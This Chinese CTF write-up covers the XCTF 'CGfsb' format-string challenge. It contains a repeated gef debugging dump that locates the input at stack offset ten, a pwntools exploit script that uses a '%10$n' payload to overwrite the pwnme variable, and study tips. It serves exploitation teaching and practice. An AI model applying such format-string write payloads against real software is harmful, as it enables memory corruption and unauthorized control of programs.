
```
1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71  72  73  74  75  76  77  78  79  80  81  82  83  84  85  86  87  88  89  90  91  92  93  94  95  96  97  98  99  100  101  102  103  104  105  106
gef➤ break *0x80486CD
Breakpoint 1 at 0x80486cd
gef➤  r
Starting program: /home/dc/playground/xctf_word/pwn/CGfsb
please tell me your name:
noname
leave your message please:
AAAAAAAAA
hello noname
your message is:
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffce48 → "AAAAAAAAA\n"
$ebx   : 0xffffce48 → "AAAAAAAAA\n"
$ecx   : 0xf7fb5dc7 → 0xfb68900a
$edx   : 0xf7fb6890 → 0x00000000
$esp   : 0xffffce20 → 0xffffce48 → "AAAAAAAAA\n"
$ebp   : 0xffffcec8 → 0x00000000
$esi   : 0xf7fb5000 → 0x001d7d8c
$edi   : 0xffffceac → 0xc5585300
$eip   : 0x080486cd →  <main+256> call 0x8048460 <printf@plt>
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce20│+0x0000: 0xffffce48 → "AAAAAAAAA\n"     ← $esp
0xffffce24│+0x0004: 0xffffce3e → "noname\n"
0xffffce28│+0x0008: 0xf7fb55c0 → 0xfbad208b
0xffffce2c│+0x000c: 0xffffce8c → 0x00000000
0xffffce30│+0x0010: 0xf7ffda9c → 0xf7fd03e0 → 0xf7ffd940 → 0x00000000
0xffffce34│+0x0014: 0x00000001
0xffffce38│+0x0018: 0xf7fd0410 → 0x0804834b → "GLIBC_2.0"
0xffffce3c│+0x001c: 0x6f6e0001
────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
0x80486c1 <main+244>       call 0x8048490 <puts@plt>
0x80486c6 <main+249>       lea    eax, [esp+0x28]
0x80486ca <main+253>       mov    DWORD PTR [esp], eax
→ 0x80486cd <main+256>       call 0x8048460 <printf@plt>
↳ 0x8048460 <printf@plt+0>   jmp    DWORD PTR ds:0x804a014
0x8048466 <printf@plt+6>   push 0x10
0x804846b <printf@plt+11>  jmp 0x8048430
0x8048470 <fgets@plt+0>    jmp    DWORD PTR ds:0x804a018
0x8048476 <fgets@plt+6>    push 0x18
0x804847b <fgets@plt+11>   jmp 0x8048430
────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt ( )
────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "CGfsb", stopped 0x80486cd in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80486cd → main()
───────────────────────────────────────────────────────────────────────────────────────────────

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffce48 → "AAAAAAAAA\n"
$ebx   : 0xffffce48 → "AAAAAAAAA\n"
$ecx   : 0xf7fb5dc7 → 0xfb68900a
$edx   : 0xf7fb6890 → 0x00000000
$esp   : 0xffffce20 → 0xffffce48 → "AAAAAAAAA\n"
$ebp   : 0xffffcec8 → 0x00000000
$esi   : 0xf7fb5000 → 0x001d7d8c
$edi   : 0xffffceac → 0xc5585300
$eip   : 0x080486cd →  <main+256> call 0x8048460 <printf@plt>
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce20│+0x0000: 0xffffce48 → "AAAAAAAAA\n"     ← $esp
0xffffce24│+0x0004: 0xffffce3e → "noname\n"
0xffffce28│+0x0008: 0xf7fb55c0 → 0xfbad208b
0xffffce2c│+0x000c: 0xffffce8c → 0x00000000
0xffffce30│+0x0010: 0xf7ffda9c → 0xf7fd03e0 → 0xf7ffd940 → 0x00000000
0xffffce34│+0x0014: 0x00000001
0xffffce38│+0x0018: 0xf7fd0410 → 0x0804834b → "GLIBC_2.0"
0xffffce3c│+0x001c: 0x6f6e0001
────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
0x80486c1 <main+244>       call 0x8048490 <puts@plt>
0x80486c6 <main+249>       lea    eax, [esp+0x28]
0x80486ca <main+253>       mov    DWORD PTR [esp], eax
→ 0x80486cd <main+256>       call 0x8048460 <printf@plt>
↳ 0x8048460 <printf@plt+0>   jmp    DWORD PTR ds:0x804a014
0x8048466 <printf@plt+6>   push 0x10
0x804846b <printf@plt+11>  jmp 0x8048430
0x8048470 <fgets@plt+0>    jmp    DWORD PTR ds:0x804a018
0x8048476 <fgets@plt+6>    push 0x18
0x804847b <fgets@plt+11>   jmp 0x8048430
────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt ( )
────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "CGfsb", stopped 0x80486cd in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80486cd → main()
───────────────────────────────────────────────────────────────────────────────────────────────
Breakpoint 1, 0x080486cd in main ()
gef➤  x/10wx $esp
0xffffce20: 0xffffce48   0xffffce3e   0xf7fb55c0   0xffffce8c
0xffffce30: 0xf7ffda9c   0x00000001   0xf7fd0410   0x6f6e0001
0xffffce40: 0x656d616e   0x0000000a
gef➤  x/20wx $esp
0xffffce20: 0xffffce48   0xffffce3e   0xf7fb55c0   0xffffce8c
0xffffce30: 0xf7ffda9c   0x00000001   0xf7fd0410   0x6f6e0001
0xffffce40: 0x656d616e   0x0000000a   0x41414141   0x41414141
0xffffce50: 0x00000a41   0x00000000   0x00000000   0x00000000
0xffffce60: 0x00000000   0x00000000   0x00000000   0x00000000
```

在第十个位置上存放我们的字符串，据此编写exp：

```python
from pwn import *
context.log_level = "DEBUG"
pwnme_address = 0x0804A068
payload = p32(pwnme_address)+'AAAA'+'%10$n'

io = process('CGfsb')
io.recv()
io.sendline('noname')
io.recv()

io.sendline(payload)
io.recv()
```

## 一些小技巧

1. 学习别人exp的时候，仅仅看懂可能还不够，尝试添加`gdb.attach`上去试试`payload`发出去之后控制流如何变化。

2. 有些时候书本上由于篇幅原因一些知识一笔带过，但是比较重要的基础知识例如elf文件格式，最好花时间学习书后的参考资料，相关的paper,etc.

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于  2021-5-14 00:45 被顾言庭编辑 ，原因：
